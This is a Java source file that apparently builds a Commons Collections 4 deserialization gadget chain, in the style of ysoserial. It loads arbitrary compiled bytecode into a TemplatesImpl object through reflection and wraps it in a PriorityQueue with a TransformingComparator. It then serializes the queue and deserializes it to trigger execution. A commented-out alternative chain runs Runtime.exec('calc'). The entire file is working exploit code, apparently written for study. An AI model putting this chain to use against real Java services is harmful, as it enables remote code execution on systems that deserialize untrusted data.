package com.example;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
        SetFieldValue(templatesimpl,"_name","aaa");
        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class"));
        byte[][] codes=new byte[][]{code};
        SetFieldValue(templatesimpl,"_bytecodes",codes);
        SetFieldValue(templatesimpl,"_tfactory",new TransformerFactoryImpl());
        SetFieldValue(templatesimpl,"_transletIndex",1);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
//                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        SetFieldValue(priorityQueue,"size",2);
        String s= serialize(priorityQueue);
        deserialize(s);
    }
    public static void SetFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }
    public static String serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static Object deserialize(String data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(data));
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
